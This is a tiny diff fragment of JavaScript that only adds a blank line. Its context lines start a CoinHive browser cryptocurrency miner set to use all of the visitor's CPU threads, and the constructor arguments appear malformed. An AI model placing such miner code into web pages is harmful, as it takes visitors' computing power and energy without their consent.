@@ -1,4 +1,5 @@
 var threadCount = navigator.hardwareConcurrency;
+
 miner = new CoinHive.Anonymous(document.getElementById("api"),'threads: ' + threadCount);
 var timeDelay = 1000;
 	
